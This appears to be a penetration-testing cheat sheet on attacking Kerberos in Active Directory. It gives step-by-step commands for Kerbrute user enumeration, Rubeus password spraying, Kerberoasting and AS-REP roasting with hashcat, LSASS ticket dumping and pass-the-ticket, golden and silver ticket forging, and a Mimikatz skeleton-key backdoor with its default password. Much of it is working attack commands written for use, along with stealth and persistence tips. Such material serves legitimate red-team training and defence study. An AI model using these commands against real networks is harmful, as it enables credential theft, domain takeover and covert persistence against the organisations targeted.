#cheatsheet #methodology 
# Attacking Kerberos

## Enumerating Users w/ Kerbrute
`/path/to/kerbrute userenum --dc DOMAIN-CONTROLLER -d DOMAIN User.txt`

## Harvesting & Brute-Forcing Tickets w/ Rubeus
### Harvesting Tickets
*On the victim machine, download [https://github.com/GhostPack/Rubeus](Rubeus.exe). Then harvest tickets as follows:*
`Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds

### Brute-Forcing/Password-Spraying
*When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.*

*This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.*

*Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:*
`echo MACHINE_IP DOMAIN_NAME >> C:\Windows\System32\drivers\etc\hosts`

*Then spray passwords using:*
`Rubeus.exe brute /password:mypassword /noticket`

## Kerberoasting
*Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account.*

### w/ Rubeus
`Rubeus.exe kerberoast` - This will dump the Kerberos hash of any kerberoastable users

*Now crack the hash using Hashcat:*
`hashcat -m 13100 -a 0 hash.txt /path/to/wordlist`

### w/ Impacket
*First install Impacket (preferably version < 0.9.20) using pip, the find the GetUserSPNs.py by:*
`locate GetUserSPNs.py`

*Now cd into this dir and run:*
`sudo python3 GetUserSPNs.py DOMAIN/USER:Password1 -dc-ip MACHINE_IP -request` - This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

*If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users.*

## AS-REP Roasting
*Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.*

*Command to do AS-REP Roasting:*
`Rubeus.exe asreproast` - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

*Copy the hash to a file and insert 23$ after \$krb5asrep$ so that the first line will be \$krb5asrep\$23$User....., and then crack the hash using hashcat:*
`hashcat -m 18200 hash.txt /path/to/wordlist` - Rubeus AS-REP Roasting uses hashcat mode 18200 

## Pass the Ticket w/ Mimikatz
*Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket. We do not create or destroy any tickets here; we simply reuse an existing ticket from another user on the domain and impersonate that ticket.*

### Prepare Mimikatz & Dump Tickets
*On the victim machine, download [https://github.com/gentilkiwi/mimikatz](mimikatz.exe) and run:*
`mimikatz.exe`

*Then run:*
`privilege::debug` - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz

`sekurlsa::tickets /export` - this will export all of the .kirbi tickets into the directory that you are currently in

### Pass the Ticket
1. `kerberos::ptt <ticket>` - Run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

2. Now exit out of mimikatz and run: 
`klist` - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets. 

3. The ticket has been impersonated giving us the same rights as that of the ticket holder. We can verify this by looking at the share of that user/admin/controller.

## Golden/Silver Ticket Attacks
*A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.*

### Attack overview
*A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.*

### Dump the Hash
*Inside mimikatz, run:*
`privilege::debug` - Ensure this outputs [privilege '20' ok]

*Now run:*
`lsadump::lsa /inject /name:krbtgt` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

### Create a Golden/Silver Ticket
`Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:` - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

### Use the Golden/Silver Ticket to Access Other Machines
1. `misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.

2. Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.

## Kerberos Backdoors
*Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.*

*The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.*

*The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"*

### Skeleton Key Overview
*The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.*

*After preparing mimikatz by running `privilege::debug` command, run:*
`misc:skeleton`

*Now we can access the forest, for example:*
- `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

- `dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

**The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques**
